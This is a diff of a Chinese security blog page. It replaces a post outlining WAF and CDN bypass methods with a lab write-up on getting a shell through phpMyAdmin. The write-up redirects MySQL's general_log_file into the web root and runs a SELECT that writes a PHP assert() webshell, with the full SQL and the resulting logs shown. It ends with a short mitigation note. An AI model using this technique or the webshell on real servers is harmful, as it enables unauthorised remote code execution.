@@ -3,7 +3,7 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 
-    <title>渗透测试中的Bypass技巧（一）</title>
+    <title>phpMyAdmin新姿势getshell</title>
     <meta name="description" content="倾旋的博客">
     <meta name="author" content='倾旋'>
 
@@ -80,96 +80,116 @@
 <hr>
 <div id="content">
 <div class="container">
-    <h2 id="0x00-前言">0x00 前言</h2>
-<p>许多朋友在渗透测试中因为遇到WAF而束手无策，本人应邀，与godkiller一同写下此文，希望能够对许多朋友的问题有所帮助。</p>
-<p>此系列一共分为五篇文章，分别如下：</p>
+    <h2 id="0x00-设想">0x00 设想</h2>
+<p>假设我们拥有MySQL的root权限，登录Web端的phpMyAdmin数据库管理控制台，你有多少种方法去getshell？</p>
+<p>本文旨在研究新的方法，如果在INTO OUTFILE禁用的情况下，或许会少很多思路了。</p>
+<p>这里的禁用是完全（权限）禁用，而不是拦截行为。</p>
+<h2 id="0x01-常规方法测试">0x01 常规方法测试</h2>
+<p>好了，入正题，我目前拥有一台WIN XP虚拟机，上面的服务如下：</p>
 <ul>
-<li>一、架构层绕过WAF</li>
+<li>Apache 2.4.23（此环境与本文实现的攻击关系不大）</li>
+<li>PHP 5.4.45（此环境与本文实现的攻击关系不大）</li>
+<li>phpMyAdmin 4.6.6（此环境与本文实现的攻击关系不大）</li>
+<li>MySQL 5.5.53 - MySQL Community Server (GPL) （5.0以上）</li>
+<li>绝对路径：<code>C:\phpStu\WWW\</code></li>
 </ul>
-<ol>
-<li>
-<p>CDN WAF绕过</p>
-</li>
-<li>
-<p>白名单应用</p>
-</li>
-</ol>
+<p>目前大部分站点都使用了MySQL 5.0以上的版本</p>
+<p>我们先尝试一下使用SQL表达式INTO OUTFILE 去getshell：</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-92a62b6bce5a6c66aa07dcae86a45b2e_r.jpg" alt="enter description here"></p>
+<p>可以看到已经被阻止了 ，具体原因我们在这里讲一下：</p>
+<p>错误提示</p>
+<pre><code>#1290 - The MySQL server is running with the --secure-file-priv option so it cannot execute this statement.
+</code></pre><p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-103d1faf4ef1790dda328ae855828eb0_hd.jpg" alt="enter description here"></p>
+<p>secure-file-priv这个全局变量是指定文件夹作为导出文件存放的地方，默认情况下，secure-file-priv是一个空值（NULL）。我们现在设置为网站的根目录，再去尝试使用INTO OUTFILE getshell。</p>
+<p>但是在我们使用SQL修改的时候，发现这个值是只读的。</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-6120a906737c3c20d87cd3ae4c0f3db5_r.jpg" alt="enter description here"></p>
+<p>经过查阅资料知道，这个值只能通过修改MySQL的配置文件来达到修改的目的。</p>
+<h2 id="0x02-新姿势测试">0x02 新姿势测试</h2>
+<p>这些希望破灭以后我并没有沮丧，我相信这些研究都是有用的，有助于我的思考。</p>
+<p>于是把目光转向了MySQL的特性，开始测试MySQL全局变量对MySQL本身的影响。</p>
+<p>最后我发现MySQL 5.0+的版本会自动创建日志文件，那么在服务运行的情况下修改全局变量也是可以变动文件位置的，但是必须要对生成日志的目录有可读可写的权限。（Linux环境下可能会比较苛刻，因为站点目录是一个用户，MySQL是另外一个用户，权限管控较为严格，主要取决于权限配置是否得当）</p>
+<p>OK，不废话，开始测试~~</p>
+<p>首先呢，介绍两个MySQL全局变量（general_log、general_log file）</p>
 <ul>
-<li>二、匹配资源大小限制</li>
+<li>general log 指的是日志保存状态，一共有两个值（ON/OFF）ON代表开启 OFF代表关闭。</li>
+<li>general log file 指的是日志的保存路径。</li>
 </ul>
-<ol>
-<li>
-<p>服务器端配置（Data MAX Length）</p>
-</li>
-<li>
-<p>协议未正确解析</p>
-</li>
-<li>
-<p>HTTP不同的请求方法污染</p>
-</li>
-<li>
-<p>GET与POST的区别</p>
-</li>
-<li>
-<p>文件上传</p>
-</li>
-<li>
-<p>HTTP参数污染（HPP)</p>
-</li>
-</ol>
-<ul>
-<li>四、发现WAF缺陷过程</li>
-</ul>
-<ol>
-<li>
-<p>绕过某WAF上传</p>
-</li>
-<li>
-<p>绕过某WAF注入</p>
-</li>
-<li>
-<p>自动化Bypass</p>
-</li>
-<li>
-<p>思考</p>
-</li>
-</ol>
-<ul>
-<li>五、过滤/拦截规则不严谨</li>
-</ul>
-<ol>
-<li>
-<p>等价替换</p>
-</li>
-<li>
-<p>大小写替换</p>
-</li>
-<li>
-<p>不常用条件</p>
-</li>
-<li>
-<p>特殊符号</p>
-</li>
-<li>
-<p>编码</p>
-</li>
-<li>
-<p>注释</p>
-</li>
-</ol>
-<h2 id="0x01-cdn-waf绕过">0x01 CDN WAF绕过</h2>
-<p>CDN的全称是Content Delivery Network，即内容分发网络。其基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。通过在网络各处放置节点服务器所构成的在现有的互联网基础之上的一层智能虚拟网络，CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。其目的是使用户可就近取得所需内容，解决 Internet网络拥挤的状况，提高用户访问网站的响应速度。 &ndash;来源“百度”</p>
-<p>目前CDN服务的功能是越来越多，安全性也越加强悍，用户的每个请求都会被发送到指定的CDN节点上，最后转发给真实站点。这个过程就好像加了一道关卡，这个关卡提供了缓存、加速、防御的特点。</p>
-<p>在渗透测试中，如果遇到了CDN站点，几乎许多测试请求都会被CDN拦截，甚至多次请求后，会被加入黑名单。这个CDN节点属于云端WAF，如果将数据直接发送给真实站点，那么也就没有CDN的处理了，整个防御就没有任何作用。</p>
-<p>那么下面我来带给大家几个方法来绕过云端WAF。首先我们必须要查询到目标站点的真实地址才可以，这里的真实地址就指的是真实IP。以下几个方法只是个人之见，如果有遗漏或者缺点，请在文章评论指出……</p>
-<p>第一个，查询域名历史DNS解析，网上有很多站点都可以查询站点的历史DNS解析。假设我在本月10号，域名绑定的服务器IP是<code>199.199.199.***</code>，在下月15号更换了服务器的IP，那么这个<code>199.199.199.***</code>可能就会被直接记录在历史记录中。再根据历史记录进行判断当前IP是否是现在的网站真实服务器地址。</p>
-<p>第二个，查看子域名解析地址是否和主域名的IP地址相近。一般再查询域名是否存在CDN的话，我们可以看响应头、或者看解析记录，里面大多都有关于云端CDN的字眼。当然提倡写脚本，Kali Linux中也有工具 ~</p>
-<p>第三个，社工DNS 比较苛刻，需要拿到CDN那边的管理员权限开可以。</p>
-<p>第四个，CDN节点分发缺陷，通过国外IP访问网站可能会出现真实IP，因为有的CDN服务商可能只做了国内节点，没做国外的，这样访问请求是直接被转发到真实服务器地址上。</p>
-<p>那么下面来概述一下得到了绕过的条件如何进行绕过，假设服务器端的IP地址为121.121.1x1.1x1，管理员设置了CDN节点，经过上面的方法得到真实IP地址后，可以直接更改本地的hosts文件来直接将数据发送到网站服务器上。这里不再详细概述啦~</p>
-<h2 id="0x02-白名单应用子域名">0x02 白名单应用（子域名）</h2>
-<p>在有些时候，某些厂商的环境刚刚上线，用于调试项目，并没有直接将子域名添加至CDN节点，那么就有可能出现某些安全隐患，因为刚上线的项目都没有任何防御措施，如果当前项目与目标站点搭建在同一个服务器中，也会成为我们绕过WAF的有利条件。当然白名单应用不止一个上线项目，还有某些管理应用，例如：phpmyadmin，其操作完全不会被WAF拦截，当然应用过多，本人不才，只接触一些常见的，欢迎补充。</p>
-<p>感谢大家的支持。</p>
+<p>我们先查看一下全局变量 ~</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-7937fe1a956ff7ef604a1b6a8d0b803d_r.jpg" alt="enter description here"></p>
+<p>目前是OFF状态，也就是不保存SQL到日志文件中。</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-c9c5b6ab51e7f8f55eaac27d3529f189_r.jpg" alt="enter description here"></p>
+<p>这里强调一下保存过程，general_log是保存每一条你执行的SQL到文件中。目前为OFF，所以文件还没有被创建，我们修改为ON尝试让MySQL创建文件：</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-905b73ccaab7b944d18b92816250c10d_hd.jpg" alt="enter description here"></p>
+<p>我们去主机上的目录里看看这个文件是否存在：</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-edf0809c6bd914d9127e220060f60395_r.jpg" alt="enter description here"></p>
+<p>贴出文件内容：</p>
+<pre><code>C:\phpStu\mysql/bin/mysqld.exe, Version: 5.5.53 (MySQL Community Server (GPL)). started with:
+TCP Port: 3306, Named Pipe: MySQL
+Time                 Id Command    Argument
+170323 18:08:54	   35 Quit
+</code></pre><p>目前是没有什么内容的。我们在控制台随便执行一个SQL：</p>
+<pre><code>SELECT MD5('admin');
+</code></pre><p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-e8be82b148faa920ceda19d592820470_hd.jpg" alt="enter description here"></p>
+<p>贴出新的日志内容：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">C</span>:<span style="color:#960050;background-color:#1e0010">\</span>phpStu<span style="color:#960050;background-color:#1e0010">\</span>mysql<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>mysqld.exe, <span style="color:#66d9ef">Version</span>: <span style="color:#ae81ff">5</span>.<span style="color:#ae81ff">5</span>.<span style="color:#ae81ff">53</span> (MySQL Community Server (GPL)). started <span style="color:#66d9ef">with</span>:
+TCP Port: <span style="color:#ae81ff">3306</span>, Named Pipe: MySQL
+Time                 Id Command    Argument
+<span style="color:#ae81ff">170323</span> <span style="color:#ae81ff">18</span>:<span style="color:#ae81ff">08</span>:<span style="color:#ae81ff">54</span>	   <span style="color:#ae81ff">35</span> Quit	
+<span style="color:#ae81ff">170323</span> <span style="color:#ae81ff">18</span>:<span style="color:#ae81ff">12</span>:<span style="color:#ae81ff">55</span>	   <span style="color:#ae81ff">36</span> <span style="color:#66d9ef">Connect</span>	root<span style="color:#f92672">@</span>localhost <span style="color:#66d9ef">on</span> 
+		   <span style="color:#ae81ff">36</span> Query	<span style="color:#66d9ef">SET</span> <span style="color:#66d9ef">NAMES</span> <span style="color:#e6db74">&#39;utf8&#39;</span> <span style="color:#66d9ef">COLLATE</span> <span style="color:#e6db74">&#39;utf8_general_ci&#39;</span>
+		   <span style="color:#ae81ff">36</span> Init DB	mysql
+		   <span style="color:#ae81ff">36</span> Query	<span style="color:#66d9ef">SHOW</span> MASTER LOGS
+		   <span style="color:#ae81ff">36</span> Quit	
+		   <span style="color:#ae81ff">37</span> <span style="color:#66d9ef">Connect</span>	root<span style="color:#f92672">@</span>localhost <span style="color:#66d9ef">on</span> 
+		   <span style="color:#ae81ff">37</span> Query	<span style="color:#66d9ef">SET</span> <span style="color:#66d9ef">NAMES</span> <span style="color:#e6db74">&#39;utf8&#39;</span> <span style="color:#66d9ef">COLLATE</span> <span style="color:#e6db74">&#39;utf8_general_ci&#39;</span>
+		   <span style="color:#ae81ff">37</span> Quit	
+<span style="color:#ae81ff">170323</span> <span style="color:#ae81ff">18</span>:<span style="color:#ae81ff">13</span>:<span style="color:#ae81ff">21</span>	   <span style="color:#ae81ff">38</span> <span style="color:#66d9ef">Connect</span>	root<span style="color:#f92672">@</span>localhost <span style="color:#66d9ef">on</span> 
+		   <span style="color:#ae81ff">38</span> Query	<span style="color:#66d9ef">SET</span> <span style="color:#66d9ef">NAMES</span> <span style="color:#e6db74">&#39;utf8&#39;</span> <span style="color:#66d9ef">COLLATE</span> <span style="color:#e6db74">&#39;utf8_general_ci&#39;</span>
+		   <span style="color:#ae81ff">38</span> Query	<span style="color:#66d9ef">SELECT</span> MD5(<span style="color:#e6db74">&#39;admin&#39;</span>)
+		   <span style="color:#ae81ff">38</span> Quit
+
+</code></pre></div><p>可以清除的发现，日志文件同步保存了我们所有的SQL语句……猥琐的思路从脑海中喷发而出~ 我们要在站点目录下使用MySQL的日志功能创建一个shell.php</p>
+<p>首先查看目录中不存在shell.php这个文件：
+<img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-f7cdabc60f3f39b2ca25a3f486bb23b4_r.jpg" alt="enter description here"></p>
+<p>（确保general_log 的值已经为ON，前面已经设置过了）然后设置general_log_file的值为我们一句话木马的绝对路径：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SET</span> <span style="color:#66d9ef">global</span> general_log_file<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;C:/phpStu/WWW/shell.php&#39;</span>;
+</code></pre></div><p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-66414717c8f4be26b9af449ab2634c06_r.jpg" alt="enter description here"></p>
+<p>我们再去看看站点下是否创建了这个文件：</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-e8273a7d3fdc1fbb990d8f911d17b5b9_r.jpg" alt="enter description here"></p>
+<p>创建成功，并且文件内容中也有日志的初始值。</p>
+<p>我们现在写入一句话~ 强调一下，SQL就是SQL，在保存到日志中的时候不会解析转译符号，不知道大家能否理解，我举一个例子：</p>
+<p>我们查询：</p>
+<pre><code>SELECT '&lt;?php assert($_POST[\'admin\']);?&gt;;
+</code></pre><p>保存到日志中也会变成</p>
+<pre><code>SELECT '&lt;?php assert($_POST[\'admin\']);?&gt;';
+</code></pre><p>php这边解析的时候就会报错，因此我们采用单引号与双引号公用的方式实现：</p>
+<pre><code>SELECT '&lt;?php assert($_POST[&quot;admin&quot;]);?&gt;';
+PS：$_POST中不用引号也可以~
+</code></pre><p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-0ae649932588d176756a432479ff62cf_r.jpg" alt="enter description here"></p>
+<p>我们访问看看~</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-e5cc5693f6a7e55616cdfa62f605bddc_hd.jpg" alt="enter description here"></p>
+<p>已经解析php了，我们同样测试一下是否能执行php代码吧 ~</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-b13043cfb90de8ac7a55aec067901aad_hd.jpg" alt="enter description here"></p>
+<p>贴出日志内容：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">C</span>:<span style="color:#960050;background-color:#1e0010">\</span>phpStu<span style="color:#960050;background-color:#1e0010">\</span>mysql<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>mysqld.exe, <span style="color:#66d9ef">Version</span>: <span style="color:#ae81ff">5</span>.<span style="color:#ae81ff">5</span>.<span style="color:#ae81ff">53</span> (MySQL Community Server (GPL)). started <span style="color:#66d9ef">with</span>:
+TCP Port: <span style="color:#ae81ff">3306</span>, Named Pipe: MySQL
+Time                 Id Command    Argument
+		   <span style="color:#ae81ff">44</span> Quit	
+<span style="color:#ae81ff">170323</span> <span style="color:#ae81ff">18</span>:<span style="color:#ae81ff">27</span>:<span style="color:#ae81ff">27</span>	   <span style="color:#ae81ff">45</span> <span style="color:#66d9ef">Connect</span>	root<span style="color:#f92672">@</span>localhost <span style="color:#66d9ef">on</span> 
+		   <span style="color:#ae81ff">45</span> Query	<span style="color:#66d9ef">SET</span> <span style="color:#66d9ef">NAMES</span> <span style="color:#e6db74">&#39;utf8&#39;</span> <span style="color:#66d9ef">COLLATE</span> <span style="color:#e6db74">&#39;utf8_general_ci&#39;</span>
+		   <span style="color:#ae81ff">45</span> Init DB	mysql
+		   <span style="color:#ae81ff">45</span> Query	<span style="color:#66d9ef">SHOW</span> MASTER LOGS
+<span style="color:#ae81ff">170323</span> <span style="color:#ae81ff">18</span>:<span style="color:#ae81ff">27</span>:<span style="color:#ae81ff">28</span>	   <span style="color:#ae81ff">45</span> Quit	
+		   <span style="color:#ae81ff">46</span> <span style="color:#66d9ef">Connect</span>	root<span style="color:#f92672">@</span>localhost <span style="color:#66d9ef">on</span> 
+		   <span style="color:#ae81ff">46</span> Query	<span style="color:#66d9ef">SET</span> <span style="color:#66d9ef">NAMES</span> <span style="color:#e6db74">&#39;utf8&#39;</span> <span style="color:#66d9ef">COLLATE</span> <span style="color:#e6db74">&#39;utf8_general_ci&#39;</span>
+		   <span style="color:#ae81ff">46</span> Quit	
+<span style="color:#ae81ff">170323</span> <span style="color:#ae81ff">18</span>:<span style="color:#ae81ff">28</span>:<span style="color:#ae81ff">01</span>	   <span style="color:#ae81ff">47</span> <span style="color:#66d9ef">Connect</span>	root<span style="color:#f92672">@</span>localhost <span style="color:#66d9ef">on</span> 
+		   <span style="color:#ae81ff">47</span> Query	<span style="color:#66d9ef">SET</span> <span style="color:#66d9ef">NAMES</span> <span style="color:#e6db74">&#39;utf8&#39;</span> <span style="color:#66d9ef">COLLATE</span> <span style="color:#e6db74">&#39;utf8_general_ci&#39;</span>
+		   <span style="color:#ae81ff">47</span> Query	<span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">&#39;&lt;?php assert($_POST[&#34;admin&#34;]);?&gt;&#39;</span>
+		   <span style="color:#ae81ff">47</span> Quit	
+</code></pre></div><h2 id="0x03-总结">0x03 总结</h2>
+<p>在权限把控不严谨的情况下容易出现此类攻击，如果MySQL没有权限在站点根目录下创建文件的话也就不会发生这样的情况了。</p>
+<p>修复方案就是权限把控好就可以了 ~</p>
 
 </div>
 
